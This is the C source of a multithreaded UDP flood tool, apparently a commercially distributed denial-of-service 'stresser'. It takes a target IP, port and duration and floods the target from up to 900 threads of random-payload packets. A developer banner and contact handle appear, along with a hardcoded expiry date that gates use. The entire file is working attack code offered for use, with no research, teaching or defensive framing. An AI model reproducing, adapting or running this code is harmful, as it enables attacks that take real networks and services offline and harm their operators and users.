#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h>

#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 05
#define EXPIRATION_DAY 13
#define DEFAULT_PACKET_SIZE 512
#define DEFAULT_THREAD_COUNT 900
#define TARGET_DATA_LIMIT (3LL * 2048 * 1024 * 1024)

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
volatile unsigned long long total_bytes_sent = 0;
char *global_payload = NULL;

const char *colors[] = {
    "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m",
};
int color_count = 7;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    int buff = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buff, sizeof(buff));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    unsigned long long data_sent_by_thread = 0;

    while (keep_running) {
        for (int i = 0; i < 100; i++) {
            int sent = sendto(sock, global_payload, params->packet_size, 0,
                              (struct sockaddr *)&server_addr, sizeof(server_addr));
            if (sent < 0) {
                perror("sendto failed");
                break;
            }

            __sync_fetch_and_add(&total_packets_sent, 1);
            __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
            data_sent_by_thread += params->packet_size;
        }
        usleep(1);
    }

    close(sock);
    return NULL;
}

void display_progress(time_t start_time, int duration) {
    static int color_index = 0;
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;
    if (remaining < 0) remaining = 0;

    printf("\033[2K\r");
    printf("%sTime Remaining: %02d:%02d | Packets Sent: %lu | Data Sent: %.2f MB\033[0m",
           colors[color_index], remaining / 60, remaining % 60,
           total_packets_sent, (double)total_bytes_sent / (1024 * 1024));
    fflush(stdout);

    color_index = (color_index + 1) % color_count;
}

void print_stylish_text() {
    static int color_index = 0;
    system("clear");

    time_t now;
    time(&now);

    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_date);

    double remaining_seconds = difftime(expiry_time, now);
    int remaining_days = (int)(remaining_seconds / (60 * 60 * 24));
    int remaining_hours = (int)fmod((remaining_seconds / (60 * 60)), 24);
    int remaining_minutes = (int)fmod((remaining_seconds / 60), 60);
    int remaining_seconds_int = (int)fmod(remaining_seconds, 60);

    const char *current_color = colors[color_index];
    color_index = (color_index + 1) % color_count;

    printf("\n");
    printf("%s╔════════════════════════════════════════════════╗\033[0m\n", current_color);
    printf("%s║          %s꧁༒☬𝓜𝓻 𝓡𝓪𝓳☬༒꧂%s             ║\033[0m\n", current_color, colors[(color_index + 1) % color_count], colors[(color_index + 2) % color_count]);
    printf("%s╠════════════════════════════════════════════════╣\033[0m\n", current_color);
    printf("%s║ %s ★ DEVELOPED BY: %s@RAJOWNER90  %s            ║\033[0m\n", current_color, colors[(color_index + 1) % color_count], colors[(color_index + 2) % color_count], colors[(color_index + 3) % color_count]);
    printf("%s║ %s ★ EXPIRY DATE: %s%d days, %02d:%02d:%02d   ║\033[0m\n", current_color, colors[(color_index + 4) % color_count], colors[(color_index + 1) % color_count], remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);
    printf("%s║ %s ★ TOOL INFO: POWERFUL 💪               ║\033[0m\n", current_color, colors[(color_index + 2) % color_count]);
    printf("%s║ %s ★ CONTACT: %s@RAJOWNER90                 ║\033[0m\n", current_color, colors[(color_index + 3) % color_count], colors[(color_index + 4) % color_count]);
    printf("%s╠════════════════════════════════════════════════╣\033[0m\n", current_color);
    printf("%s║          %sP O W E R F U L %s               ║\033[0m\n", current_color, colors[(color_index + 1) % color_count], colors[(color_index + 2) % color_count]);
    printf("%s╚════════════════════════════════════════════════╝\033[0m\n\n", current_color);
}

void *banner_blinker(void *arg) {
    while (keep_running) {
        print_stylish_text();
        usleep(500000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    print_stylish_text();

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    time_t now;
    time(&now);

    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("\033[1;31mExpired. Khatam Ho Gya Hai Developer sLSe Contact Kro @RAJOWNER90.\033[0m\n");
        return EXIT_FAILURE;
    }

    if (argc < 3) {
        printf("\033[1;33mExample: %s 192.168.1.1 80 60 \033[0m\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    if (packet_size <= 0 || thread_count <= 0) {
        printf("\033[1;31mInvalid packet size or thread count.\033[0m\n");
        return EXIT_FAILURE;
    }

    global_payload = malloc(packet_size);
    if (global_payload == NULL) {
        perror("Failed to allocate memory for payload");
        return EXIT_FAILURE;
    }

    generate_random_payload(global_payload, packet_size);

    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    attack_params *params = malloc(sizeof(attack_params) * thread_count);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = strdup(target_ip);
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            fprintf(stderr, "Thread creation failed for thread %d\n", i);
        }
    }

    pthread_t banner_thread;
    pthread_create(&banner_thread, NULL, banner_blinker, NULL);

    time_t start_time = time(NULL);
    while (keep_running) {
        display_progress(start_time, duration);
        if (difftime(time(NULL), start_time) >= duration) {
            keep_running = 0;
        }
        usleep(500000);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(global_payload);
    for (int i = 0; i < thread_count; i++) {
        free(params[i].target_ip);
    }
    free(threads);
    free(params);

    printf("\n\033[1;32mAttack completed! Total packets sent: %lu, Total data sent: %.2f MB\033[0m\n",
           total_packets_sent, (double)total_bytes_sent / (1024 * 1024));

    return EXIT_SUCCESS;
}